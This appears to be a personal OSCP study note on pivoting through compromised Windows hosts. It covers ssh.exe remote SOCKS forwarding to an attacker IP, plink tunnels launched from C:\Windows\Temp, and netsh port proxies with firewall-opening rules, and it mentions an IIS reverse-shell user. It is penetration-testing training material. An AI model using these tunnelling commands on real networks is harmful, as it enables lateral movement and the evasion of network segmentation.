---
aliases:
  - Port Forwarding in Windows
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - linux
  - ssh
  - ssh_tunneling
  - port_redirection
  - port_forwarding
  - windows
author: Mehdi N Tehrani
creat_date: 2024-01-04
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# ssh.exe
#ssh_exe #ssh
The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update) and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update). 
Path to openssl ssh-related tools: #openssh
```cmd
%systemdrive%\Windows\System32\OpenSSH\ssh*
```

## Process
1. Start ssh service on attacker machine
```sh
sudo systemctl start ssh
```
2. **from target machine start a remote port redirection** and open a *SOCKS proxy port* on the attacker's machine:
```cmd
ssh -N -R <attacker_socksproxy_port> <user>@<attacker_ip>
```
3. confirm on attacker machine the port has opened:
```sh
$ ss -tunlp                         
Netid      State        Recv-Q       Send-Q     Local Address:Port   Peer 
tcp        LISTEN       0            128        127.0.0.1:9998       0.0.0.0:* 
```
4. make sure the SOCKS proxy port on attacker machine has been configured in `/etc/proxychains.conf`
```
socks5  127.0.0.1  9998
```
5. use `proxychains` command to interact with any network the closest target is connected to e.g. target2
```
proxychains nmap <target2_ip>
```



# plink
#plink #putty #cli
[plink download](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
[plink usage](https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html)
putty's cli counterpart 

1. Start ssh service on attacker machine
```sh
sudo systemctl start ssh
```
2. **from target machine start a remote port redirection**:
```cmd
C:\Windows\Temp\plink.exe -ssh -l <attacker_user> -pw <password> -R 127.0.0.1:<attacker_socksproxy_port>:127.0.0.1:<target_lport> <attacker_ip>
```
3. confirm on attacker machine the port has opened:
```sh
$ ss -tunlp                         
Netid      State        Recv-Q       Send-Q     Local Address:Port   Peer 
tcp        LISTEN       0            128        127.0.0.1:<lport>    0.0.0.0:* 
```
4. use `127.0.0.1:<lport>` **to interact with the designated port on the closest target**



#iis #reverse_shell #revshell 
reverse shell user from iis:
```
iis apppool\defaultapppool
```

# netsh
#netsh #net_shell #ssh_tunneling 
SSH tunnel using Windows native tool `netsh`

1. Start ssh service on attacker machine
```sh
sudo systemctl start ssh
```
2. On target machine configure ssh tunnel using port proxy #port_proxy from target1 to target2
```cmd
netsh interface portproxy add v4tov4 listenport=<target1_lport> listenaddress=<target1_ip> connectport=<target2_port> connectaddress=<target2_ip>
```
3. Confirm port proxy has been configured
```sh
netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
----------- ----------     --------------- ----------
<target1>   <trgt1_lport>  <target2_ip>     <target2_port>
```
4. On target machine open a port on firewall #firewall 
```cmd
netsh advfirewall firewall add rule name="<rule_name>" protocol=TCP dir=in localip=<target_ip> localport=<target_lport> action=allow
```
or #powershell 
```powershell
New-NetFirewallRule -DisplayName "<rule_name>" -Direction Inbound -LocalPort <target_lport> -LocalAddress <target_ip> -Protocol TCP -Action Allow
```
5. Interact with `target2` from attacker machine via `<trgt1_lport>` on `target1`
```sh
ssh <target1> <trgt1_lport>
```

6. cleanup
#### Remove firewall rule
```cmd
netsh advfirewall firewall delete rule name="<rule_name>"
```
or #powershell
```powershell
Remove-NetFirewallRule -DisplayName '<rule_name>'
# or
Get-NetFirewallPortFilter | ? {$_.LocalPort -eq <trgt1_lport>} | Remove-NetFirewallRule
```
#### Remove portproxy rule
```cmd
netsh interface portproxy del v4tov4 listenport=<trgt1_lport> listenaddress=<trgt1_ip>
```
